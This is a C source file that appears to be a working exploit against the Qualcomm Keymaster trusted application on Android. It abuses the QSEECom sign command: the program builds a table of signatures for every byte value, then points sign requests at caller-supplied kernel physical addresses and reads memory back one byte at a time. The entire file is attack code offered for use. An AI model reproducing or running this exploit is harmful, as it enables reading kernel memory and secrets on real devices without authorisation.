#include "common.h"
#include <stdio.h>
#include <stdlib.h>
#include <stddef.h>
#include <unistd.h>
#include <dirent.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <string.h>
#include <dlfcn.h>
#include <sys/mman.h>
#include "keymaster_qcom.h"

char *sign_table[256];

void hexdump(void *_data, unsigned int len)
{
unsigned char *data = (unsigned char*)_data;
unsigned count;

for (count = 0; count < len; count++) {
if ((count & 15) == 0)
fprintf(stderr,"%04x:", count);
fprintf(stderr," %02x %c", *data,
(*data < 32) || (*data > 126) ? '.' : *data);
data++;
if ((count & 15) == 15)
fprintf(stderr,"\n");
}
if ((count & 15) != 0)
fprintf(stderr,"\n");
}

static int qseecom_get_lib_sym(qseecom_api_handle_t* km_handle)
{
    km_handle->libhandle = dlopen("libQSEEComAPI.so", RTLD_NOW);
    if (  km_handle->libhandle  ) {
        *(void **)(&km_handle->QSEECom_start_app) =
                               dlsym(km_handle->libhandle,"QSEECom_start_app");
        if (km_handle->QSEECom_start_app == NULL) {
               	   printf("dlsym: Error Loading QSEECom_start_app");
                   dlclose(km_handle->libhandle );
                   km_handle->libhandle  = NULL;
                   return -1;
            }
            *(void **)(&km_handle->QSEECom_shutdown_app) =
                               dlsym(km_handle->libhandle,"QSEECom_shutdown_app");
            if (km_handle->QSEECom_shutdown_app == NULL) {
                   printf("dlsym: Error Loading QSEECom_shutdown_app");
                   dlclose(km_handle->libhandle );
                   km_handle->libhandle  = NULL;
                   return -1;
             }
            *(void **)(&km_handle->QSEECom_send_cmd) =
                               dlsym(km_handle->libhandle,"QSEECom_send_cmd");
            if (km_handle->QSEECom_send_cmd == NULL) {
                   printf("dlsym: Error Loading QSEECom_send_cmd");
                   dlclose(km_handle->libhandle );
                   km_handle->libhandle  = NULL;
                   return -1;
             }
            *(void **)(&km_handle->QSEECom_send_modified_cmd) =
                               dlsym(km_handle->libhandle,"QSEECom_send_modified_cmd");
            if (km_handle->QSEECom_send_modified_cmd == NULL) {
                   printf("dlsym: Error Loading QSEECom_send_modified_cmd");
                   dlclose(km_handle->libhandle );
                   km_handle->libhandle  = NULL;
                   return -1;
             }
            *(void **)(&km_handle->QSEECom_set_bandwidth) =
                               dlsym(km_handle->libhandle,"QSEECom_set_bandwidth");
            if (km_handle->QSEECom_set_bandwidth == NULL) {
                   printf("dlsym: Error Loading QSEECom_set_bandwidth");
                   dlclose(km_handle->libhandle );
                   km_handle->libhandle  = NULL;
                   return -1;
             }
    } else {
        printf("failed to load qseecom library");
        return -1;
    }
    return 0;
}

static int qcom_km_generate_keypair(qseecom_api_handle_t *qseecom_func_handle, struct qcom_km_ion_info_t *ion_info, struct QSEECom_handle *api_handle,
        const keymaster_keypair_t key_type, const void* key_params,
        char* keyBlob, size_t* keyBlobLength) {

    if (key_type != TYPE_RSA) {
        printf("[-] %s:Unsupported key type %d\n", __func__, key_type);
        return -1;
    } else if (key_params == NULL) {
        printf("[-] %s:key_params == null\n", __func__);
        return -1;
    }
    if (keyBlob == NULL || keyBlobLength == NULL) {
        printf("[-] %s:output key blob or length == NULL\n", __func__);
        return -1;
    }
    keymaster_rsa_keygen_params_t* rsa_params = (keymaster_rsa_keygen_params_t*) key_params;

    keymaster_gen_keypair_cmd_t *send_cmd = NULL;
    keymaster_gen_keypair_resp_t  *resp = NULL;
    struct QSEECom_handle *handle = NULL;
    int ret = 0;

    handle = api_handle;
    send_cmd = (keymaster_gen_keypair_cmd_t *)ion_info->ion_sbuffer;
    resp = (keymaster_gen_keypair_resp_t *)(ion_info->ion_sbuffer +
                               QSEECOM_ALIGN(sizeof(keymaster_gen_keypair_cmd_t)));
    send_cmd->cmd_id = KEYMASTER_GENERATE_KEYPAIR;
    send_cmd->key_type = key_type;
    send_cmd->rsa_params.modulus_size = rsa_params->modulus_size;
    send_cmd->rsa_params.public_exponent = rsa_params->public_exponent;
    resp->status = KEYMASTER_FAILURE;
    resp->key_blob_len =  sizeof(qcom_km_key_blob_t);
    
    if((qseecom_func_handle->QSEECom_set_bandwidth)(api_handle, 1)) {
		printf("[!] %s: Error occured while trying to set bandwidth\n", __func__);
	}
    
    printf("[+] %s: Trying to send generate key_pair command\n", __func__);

    ret = (qseecom_func_handle->QSEECom_send_cmd)(handle, send_cmd,
                               QSEECOM_ALIGN(sizeof(keymaster_gen_keypair_cmd_t)), resp,
                               QSEECOM_ALIGN(sizeof(keymaster_gen_keypair_resp_t)));
    if((qseecom_func_handle->QSEECom_set_bandwidth)(api_handle, 0)) {
		printf("[!] %s: Error occured while trying to unset bandwidth\n", __func__);
	}

    if ( (ret < 0)  ||  (resp->status  < 0)) {
        printf("[-] %s:Generate key command failed resp->status = %d ret =%d\n", __func__, resp->status, ret);
        return -1;
    } else {
    	memcpy(keyBlob, (unsigned char *)(&resp->key_blob), resp->key_blob_len);
    	*keyBlobLength = resp->key_blob_len;
    	printf("[+] %s: Generated key pair successfully of length:%d, Expected:%d\n", __func__, *keyBlobLength, sizeof(qcom_km_key_blob_t));
    }
    return 0;
}


int create_sign_table(qseecom_api_handle_t *qseecom_func_handle, struct qcom_km_ion_info_t *ion_info, struct QSEECom_handle *api_handle,
        const void* params,
        const uint8_t* keyBlob, const size_t keyBlobLength)
{
    
    keymaster_rsa_sign_params_t* sign_params = (keymaster_rsa_sign_params_t*) params;
    keymaster_sign_data_cmd_t *send_cmd = NULL;
    keymaster_sign_data_resp_t  *resp = NULL;
    struct qcom_km_ion_info_t ion_buf_info;
    struct QSEECom_ion_fd_info  ion_fd_info;
    char *sign_data;
    int ret = 0;
    int curr_data = 0;

    if (qcom_km_ION_memalloc(&ion_buf_info, 1) < 0) {
        printf("[-] %s: ION Memalloc Failed\n", __func__);
        return -1;
    }
    memset(&ion_fd_info, 0, sizeof(struct QSEECom_ion_fd_info));

    /* Populate the send data structure */
    ion_fd_info.data[0].fd = ion_buf_info.ifd_data_fd;
    ion_fd_info.data[0].cmd_buf_offset = sizeof(keymaster_cmd_t) +
         sizeof(qcom_km_key_blob_t) + sizeof(keymaster_rsa_sign_params_t);

    send_cmd = (keymaster_sign_data_cmd_t *)ion_info->ion_sbuffer;
    resp = (keymaster_sign_data_resp_t *)(ion_info->ion_sbuffer +
                            QSEECOM_ALIGN(sizeof(keymaster_sign_data_cmd_t)));
    memset(resp, 0, sizeof(keymaster_sign_data_resp_t));
    send_cmd->cmd_id = KEYMASTER_SIGN_DATA ;
    send_cmd->sign_param.digest_type = sign_params->digest_type;
    send_cmd->sign_param.padding_type = sign_params->padding_type;
    memcpy((unsigned char *)(&send_cmd->key_blob), keyBlob, keyBlobLength);
    if((qseecom_func_handle->QSEECom_set_bandwidth)(api_handle, 1)) {
			printf("[!] %s: Error occured while trying to set bandwidth\n", __func__);
	}
	
	printf("[*] %s: Trying to create Rainbow Table\n", __func__);
    
    for(curr_data=0; curr_data < 256; curr_data++) {
    
		memcpy((unsigned char *)ion_buf_info.ion_sbuffer, &curr_data, 1);

		send_cmd->data = (uint32_t)ion_buf_info.ion_sbuffer;
		send_cmd->dlen = 1;
		resp->sig_len = KM_KEY_SIZE_MAX;
		resp->status = KEYMASTER_FAILURE;
		
		ret = (qseecom_func_handle->QSEECom_send_modified_cmd)(api_handle, send_cmd,
		                           QSEECOM_ALIGN(sizeof(*send_cmd)), resp,
		                           QSEECOM_ALIGN(sizeof(*resp)), &ion_fd_info);
		                           
		if ( (ret < 0)  ||  (resp->status  < 0)) {
		    printf("[-] %s:Sign data command failed resp->status = %d ret =%d", __func__,resp->status, ret);
		    return -1;
		} else {
			sign_data = malloc(resp->sig_len);
			memcpy(sign_data, &resp->signed_data, resp->sig_len);
			sign_table[curr_data] = sign_data;
		}
    }
    if((qseecom_func_handle->QSEECom_set_bandwidth)(api_handle, 0)) {
			printf("[!] %s: Error occured while trying to unset bandwidth\n", __func__);
		}
    printf("[+] %s: Rainbow Table Created Sucessfully\n", __func__);
    return 0;
}


int leak_physical_address(qseecom_api_handle_t *qseecom_func_handle, struct qcom_km_ion_info_t *ion_info, struct QSEECom_handle *api_handle,
        const void* params,
        const uint8_t* keyBlob, const size_t keyBlobLength, uint32_t kernel_phy, size_t len)
{
    
    keymaster_rsa_sign_params_t* sign_params = (keymaster_rsa_sign_params_t*) params;
    keymaster_sign_data_cmd_t *send_cmd = NULL;
    keymaster_sign_data_resp_t  *resp = NULL;
    char *sign_data;
    int ret = 0;
    uint32_t curr_data = 0;
    int ind = 0;

    send_cmd = (keymaster_sign_data_cmd_t *)ion_info->ion_sbuffer;
    resp = (keymaster_sign_data_resp_t *)(ion_info->ion_sbuffer +
                            QSEECOM_ALIGN(sizeof(keymaster_sign_data_cmd_t)));
    memset(resp, 0, sizeof(keymaster_sign_data_resp_t));
    send_cmd->cmd_id = KEYMASTER_SIGN_DATA ;
    send_cmd->sign_param.digest_type = sign_params->digest_type;
    send_cmd->sign_param.padding_type = sign_params->padding_type;
    memcpy((unsigned char *)(&send_cmd->key_blob), keyBlob, keyBlobLength);
    if((qseecom_func_handle->QSEECom_set_bandwidth)(api_handle, 1)) {
			printf("[!] %s: Error occured while trying to set bandwidth\n", __func__);
	}
	
	printf("[*] %s: Trying to Compute Data from Physical Address: 0x%x - 0x%x\n", __func__, kernel_phy, (kernel_phy + len));
    
    for(curr_data=kernel_phy; curr_data < (kernel_phy + len); curr_data++) {
    
		// Here we are directly using kernel physical address
		send_cmd->data = curr_data;
		send_cmd->dlen = 1;
		resp->sig_len = KM_KEY_SIZE_MAX;
		resp->status = KEYMASTER_FAILURE;
		
		// Now we call send cmd instead of send modfd cmd
		// There is no way for kernel to know that this command buffer has an internel pointer.
		ret = (qseecom_func_handle->QSEECom_send_cmd)(api_handle, send_cmd,
		                           QSEECOM_ALIGN(sizeof(*send_cmd)), resp,
		                           QSEECOM_ALIGN(sizeof(*resp)));
		                           
		if ( (ret < 0)  ||  (resp->status  < 0)) {
		    printf("[-] %s:Sign data command failed resp->status = %d ret =%d", __func__,resp->status, ret);
		    return -1;
		} else {
			for(ind=0; ind < 256; ind++) {
				if(!memcmp(&resp->signed_data, sign_table[ind], resp->sig_len)) {
					printf("[+] Address 0x%x: 0x%x\n", curr_data, ind);
					break;
				}
			}
		}
    }
    printf("[+] %s: Leaked data from Phyiscal Address\n", __func__);
    if((qseecom_func_handle->QSEECom_set_bandwidth)(api_handle, 0)) {
			printf("[!] %s: Error occured while trying to unset bandwidth\n", __func__);
	}
    return 0;
}


int32_t qcom_km_ION_memalloc(struct qcom_km_ion_info_t *handle,
                                uint32_t size)
{
    int32_t ret = 0;
    int32_t iret = 0;
    int32_t fd = 0;
    unsigned char *v_addr;
    struct ion_allocation_data ion_alloc_data;
    int32_t ion_fd;
    int32_t rc;
    struct ion_fd_data ifd_data;
    struct ion_handle_data handle_data;

    /* open ION device for memory management
     * O_DSYNC -> uncached memory
    */
    ion_fd  = open("/dev/ion", O_RDONLY | 0x0010);
    if (ion_fd < 0) {
       printf("[-] %s: Error::Cannot open ION device\n", __func__);
       return -1;
    }
    handle->ion_sbuffer = NULL;
    handle->ifd_data_fd = 0;

    /* Size of allocation */
    ion_alloc_data.len = size;

    /* 4K aligned */
    ion_alloc_data.align = 4096;

    /* memory is allocated from EBI heap */
   ion_alloc_data.heap_mask= (1 << 27);

    /* Set the memory to be uncached */
    ion_alloc_data.flags = 0;

    /* IOCTL call to ION for memory request */
    rc = ioctl(ion_fd, 0xC0144900, &ion_alloc_data);
    if (rc) {
       ret = -1;
       goto alloc_fail;
    }

    if (ion_alloc_data.handle != NULL) {
       ifd_data.handle = ion_alloc_data.handle;
    } else {
       ret = -1;
       goto alloc_fail;
    }
    /* Call MAP ioctl to retrieve the ifd_data.fd file descriptor */
    rc = ioctl(ion_fd, 0xC0084902, &ifd_data);
    if (rc) {
       ret = -1;
       goto ioctl_fail;
    }

    /* Make the ion mmap call */
    v_addr = (unsigned char *)mmap(NULL, ion_alloc_data.len,
                                    PROT_READ | PROT_WRITE,
                                    MAP_SHARED, ifd_data.fd, 0);
    if (v_addr == MAP_FAILED) {
       printf("[-] %s::ION MMAP failed\n", __func__);
       ret = -1;
       goto map_fail;
    }
    handle->ion_fd = ion_fd;
    handle->ifd_data_fd = ifd_data.fd;
    handle->ion_sbuffer = v_addr;
    //printf("[+] %s: ION Buffer Start:%p,%p\n", __func__, v_addr, v_addr + size);
    handle->ion_alloc_handle.handle = ion_alloc_data.handle;
    handle->sbuf_len = size;
    return ret;

map_fail:
    if (handle->ion_sbuffer != NULL) {
        iret = munmap(handle->ion_sbuffer, ion_alloc_data.len);
        if (iret)
           printf("[-] %s::Failed to unmap memory for load image. ret = %d\n", __func__ ,ret);
    }

ioctl_fail:
    handle_data.handle = ion_alloc_data.handle;
    if (handle->ifd_data_fd)
        close(handle->ifd_data_fd);
    iret = ioctl(ion_fd, 0xC0044901, &handle_data);
    if (iret) {
       printf("[-] %s::ION FREE ioctl returned error = %d\n", __func__,iret);
    }

alloc_fail:
    if (ion_fd > 0)
       close(ion_fd);
    return ret;
}

int keymaster_leak(int argc, char **argv) {
	
	qseecom_api_handle_t qseecom_func_handle;
	int ret;
	int session_id;
	struct QSEECom_handle *api_handle;
	struct qcom_km_ion_info_t ion_info;
	keymaster_rsa_keygen_params_t rsa_prams;
	keymaster_rsa_sign_params_t sign_params;
	char key_data[4096];
	int key_blob_len;
	
	char to_sign[1024];
	char signature_blob[1024];
	size_t sign_length;
	uint32_t kernel_phy, phy_len;
	
	if(argc < 3) {
		printf("[-] Usage %s <physical_address> <length_of_data>\n", argv[0]);
		return -1;
	}
	
	kernel_phy = atoi(argv[1]);
	phy_len = atoi(argv[2]);
	printf("[*] Trying to leak data from Physical Address: 0x%x-0x%x\n", kernel_phy, kernel_phy + phy_len);
	
	
	if(qseecom_get_lib_sym(&qseecom_func_handle)) {
		printf("[!] %s: Unable to load QSEEComAPI\n", __func__);
		goto error;
	}
	printf("[+] %s: QSEEComAPI Initilaized Successfully\n", __func__);
	
	api_handle = (struct QSEECom_handle*) malloc(sizeof(struct QSEECom_handle));
	memset(&api_handle, 0, sizeof(struct QSEECom_handle));
	
	//start app
	ret = (qseecom_func_handle.QSEECom_start_app)((struct QSEECom_handle **)&api_handle, "/vendor/firmware/keymaster", "keymaster", 4096*2);
	
	if(ret) {
		printf("[!] %s: Keymaster App loading failed, ret:%d\n", __func__, ret);
		goto error;
	}	
    
    printf("[+] %s: Loaded Keymaster App Successfully\n", __func__);
    
    ret = qcom_km_ION_memalloc(&ion_info, 4096*4);
    
    if(ret) {
		printf("[!] %s: Keymaster ION Alloc failed, ret:%d\n", __func__, ret);
		goto error;
	}	
    
    printf("[+] %s: Keymaster ION Alloc Successfull\n", __func__);
    
    rsa_prams.modulus_size = 1024;
    rsa_prams.public_exponent = 0x3;
    
    memset(key_data, 0, sizeof(key_data));
    
    if(qcom_km_generate_keypair(&qseecom_func_handle, &ion_info, api_handle, TYPE_RSA, (void*)&rsa_prams, key_data, &key_blob_len)) {
    	printf("[!] %s: Generate keypair failed\n", __func__);
    }
    
    memset(to_sign, 1, 2);
    
    sign_params.digest_type = DIGEST_NONE;
    sign_params.padding_type = PADDING_NONE;
    
    memset(signature_blob, 2, sizeof(signature_blob));
    
    create_sign_table(&qseecom_func_handle, &ion_info, api_handle, (void*)&sign_params, key_data, key_blob_len);
    
    leak_physical_address(&qseecom_func_handle, &ion_info, api_handle, (void*)&sign_params, key_data, key_blob_len, kernel_phy, phy_len);
    
    printf("[+] %s: Leak Successful\n", __func__);
    
    return 0;
    
    error:
    	printf("[-] %s: Keymaster Leak Failed\n");
    	return -1;
	
}

int main(int argc, char **argv) {
	return keymaster_leak(argc, argv);
}
